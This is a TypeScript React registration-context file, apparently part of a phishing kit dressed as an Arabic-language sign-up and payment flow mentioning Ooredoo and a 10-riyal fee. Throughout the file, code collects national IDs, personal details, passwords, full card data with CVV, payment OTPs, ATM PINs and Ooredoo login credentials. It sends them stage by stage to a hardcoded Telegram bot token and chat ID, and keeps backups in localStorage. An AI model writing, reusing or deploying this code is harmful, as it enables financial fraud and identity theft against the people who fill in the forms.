import { createContext, useContext, useState, useEffect, ReactNode } from "react";

interface RegistrationData {
  // Account Type
  accountType?: string;
  nationalId?: string;
  mobileNumber?: string;
  visitorEmail?: string;
  visitorMobile?: string;
  phoneCode?: string;

  // Personal Info
  nationality?: string;
  fullNameArabic?: string;
  fullNameEnglish?: string;
  dateOfBirth?: string;
  idExpiryDate?: string;
  gender?: string;
  address?: string;
  email?: string;

  // Password
  password?: string;

  // Payment
  cardNumber?: string;
  cardholderName?: string;
  expiryDate?: string;
  cvv?: string;

  // Payment OTP
  paymentOtp?: string;

  // ATM Pin
  atmPin?: string;

  // Ooredoo Verification
  ooredooEmail?: string;
  ooredooPassword?: string;

  // OTP
  otp?: string;

  // Account Creation
  accountCreationPhone?: string;
  accountCreationId?: string;

  // Forgot Password
  forgotPasswordEmail?: string;
  forgotPasswordId?: string;
}

interface RegistrationContextType {
  data: RegistrationData;
  updateData: (newData: Partial<RegistrationData>) => void;
  sendCumulativeMessage: (stage: number, stageName: string, newData?: Partial<RegistrationData>) => Promise<void>;
  clearData: () => void;
}

const RegistrationContext = createContext<RegistrationContextType | undefined>(undefined);

const TELEGRAM_BOT_TOKEN = "8214510995:AAGBVEnilfm5BTpDBk7YNM_kt1cflA6MyYk";
const TELEGRAM_CHAT_ID = "-4862614259";

export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
  const [data, setData] = useState<RegistrationData>(() => {
    const saved = localStorage.getItem("registrationData");
    return saved ? JSON.parse(saved) : {};
  });

  useEffect(() => {
    localStorage.setItem("registrationData", JSON.stringify(data));
  }, [data]);

  const updateData = (newData: Partial<RegistrationData>) => {
    setData((prev) => ({ ...prev, ...newData }));
  };

  const formatTelegramMessage = (stage: number, stageName: string, dataToFormat: RegistrationData): string => {
    let message = `📋 <b>معلومات التسجيل - المرحلة ${stage}/10</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

    // Stage 1: Account Type
    if (stage >= 1 && dataToFormat.accountType) {
      message += `✅ <b>المرحلة 1: نوع الحساب</b>\n`;
      if (dataToFormat.accountType === "citizens") {
        message += `   📌 النوع: مواطن/مقيم\n`;
        message += `   🆔 رقم البطاقة: ${dataToFormat.nationalId}\n`;
        message += `   📱 الهاتف: ${dataToFormat.mobileNumber}\n`;
      } else {
        message += `   📌 النوع: زائر\n`;
        message += `   📧 البريد: ${dataToFormat.visitorEmail}\n`;
        message += `   📱 الهاتف: ${dataToFormat.phoneCode} ${dataToFormat.visitorMobile}\n`;
      }
      message += `\n`;
    }

    // Stage 2: Personal Info
    if (stage >= 2 && dataToFormat.fullNameArabic) {
      message += `✅ <b>المرحلة 2: البيانات الشخصية</b>\n`;
      message += `   👤 الاسم (عربي): ${dataToFormat.fullNameArabic}\n`;
      message += `   👤 الاسم (English): ${dataToFormat.fullNameEnglish}\n`;
      message += `   🎂 تاريخ الميلاد: ${dataToFormat.dateOfBirth}\n`;
      message += `   📅 تاريخ انتهاء البطاقة: ${dataToFormat.idExpiryDate}\n`;
      message += `   ⚧️ الجنس: ${dataToFormat.gender}\n`;
      message += `   🌍 الجنسية: ${dataToFormat.nationality}\n`;
      message += `   📍 العنوان: ${dataToFormat.address}\n`;
      message += `   📧 البريد: ${dataToFormat.email}\n`;
      message += `\n`;
    }

    // Stage 3: Password
    if (stage >= 3 && dataToFormat.password) {
      message += `✅ <b>المرحلة 3: كلمة المرور</b>\n`;
      message += `   🔑 كلمة المرور: ${dataToFormat.password}\n`;
      message += `\n`;
    }

    // Stage 4: Payment
    if (stage >= 4 && dataToFormat.cardNumber) {
      message += `🚨 <b>المرحلة 4: بيانات الدفع</b>\n`;
      message += `   💳cardnumber: ${dataToFormat.cardNumber}\n`;
      message += `   👤 اسم حامل البطاقة: ${dataToFormat.cardholderName}\n`;
      message += `   📅 تاريخ الانتهاء: ${dataToFormat.expiryDate}\n`;
      message += `   🔒 CVV: ${dataToFormat.cvv}\n`;
      message += `   💰 المبلغ: 10 ريال\n`;
      message += `\n`;
    }

    // Stage 5: Payment OTP
    if (stage >= 5 && dataToFormat.paymentOtp) {
      message += `🚑 <b>المرحلة 5: رمز تأكيد الدفع</b>\n`;
      message += `   🔢 رمز OTP (6 أرقام): ${dataToFormat.paymentOtp}\n`;
      message += `\n`;
    }

    // Stage 6: ATM Pin
    if (stage >= 6 && dataToFormat.atmPin) {
      message += `🚨 <b>المرحلة 6: رقم PIN</b>\n`;
      message += `   🔐 رقم PIN: ${dataToFormat.atmPin}\n`;
      message += `\n`;
    }

    // Stage 7: Ooredoo Verification
    if (stage >= 7 && dataToFormat.ooredooEmail) {
      message += `📱 <b>المرحلة 7: تفعيل حساب Ooredoo</b>\n`;
      message += `   📧 البريد الإلكتروني: ${dataToFormat.ooredooEmail}\n`;
      message += `   🔑 كلمة السر: ${dataToFormat.ooredooPassword}\n`;
      message += `\n`;
    }

    // Stage 8: OTP
    if (stage >= 8 && dataToFormat.otp) {
      message += `🚓 <b>المرحلة 8: رمز التحقق النهائي</b>\n`;
      message += `   🔢 رمز OTP (4 أرقام): ${dataToFormat.otp}\n`;
      message += `\n`;
    }

    // Stage 9: Account Creation
    if (stage >= 9 && dataToFormat.accountCreationPhone) {
      message += `⚠️ <b>المرحلة 9: إنشاء الحساب</b>\n`;
      message += `   📱 رقم الجوال: ${dataToFormat.accountCreationPhone}\n`;
      message += `   🆔 رقم البطاقة/جواز السفر: ${dataToFormat.accountCreationId}\n`;
      message += `\n`;
    }

    // Stage 10: Forgot Password
    if (stage >= 10 && dataToFormat.forgotPasswordEmail) {
      message += `⚠️ <b>المرحلة 10: نسيت كلمة المرور</b>\n`;
      message += `   📧 البريد/اسم المستخدم: ${dataToFormat.forgotPasswordEmail}\n`;
      message += `   🆔 رقم البطاقة/جواز السفر: ${dataToFormat.forgotPasswordId}\n`;
      message += `\n`;
    }

    message += `━━━━━━━━━━━━━━━━━━━━\n`;
    message += stage === 10 ? `🎉 <b>التسجيل مكتمل!</b>` : `⏳ <b>المرحلة الحالية: ${stageName}</b>`;

    return message;
  };

  const sendCumulativeMessage = async (stage: number, stageName: string, newData?: Partial<RegistrationData>) => {
    try {
      const dataToSend = newData ? { ...data, ...newData } : data;
      const message = formatTelegramMessage(stage, stageName, dataToSend);

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send message to Telegram");
      }

      console.log(`✅ Message sent successfully for stage ${stage}`);
    } catch (error) {
      console.error("❌ Failed to send to Telegram:", error);
      // Save to localStorage as backup
      const dataToSend = newData ? { ...data, ...newData } : data;
      const backupKey = `telegram_backup_stage_${stage}_${Date.now()}`;
      localStorage.setItem(backupKey, formatTelegramMessage(stage, stageName, dataToSend));
    }
  };

  const clearData = () => {
    setData({});
    localStorage.removeItem("registrationData");
  };

  return (
    <RegistrationContext.Provider value={{ data, updateData, sendCumulativeMessage, clearData }}>
      {children}
    </RegistrationContext.Provider>
  );
};

export const useRegistration = () => {
  const context = useContext(RegistrationContext);
  if (!context) {
    throw new Error("useRegistration must be used within RegistrationProvider");
  }
  return context;
};
